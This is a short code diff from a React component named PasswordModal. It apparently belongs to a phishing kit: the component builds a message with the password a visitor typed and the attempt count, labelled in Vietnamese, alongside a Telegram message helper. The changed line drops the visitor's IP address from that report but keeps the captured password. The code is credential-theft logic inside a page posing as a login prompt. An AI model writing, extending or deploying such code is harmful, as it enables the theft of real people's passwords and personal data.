@@ -120,7 +120,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
       localStorage.getItem("geoData") ?? "{}",
     );
     if (lastMessage) {
-      message = `${lastMessage}\n🌐 <b>IP:</b> <code>${geoData.ip}</code>🔑 <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
+      message = `${lastMessage}\n🔑 <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
     } else {
       message = createTelegramMessage(formData, uiState.password);
     }
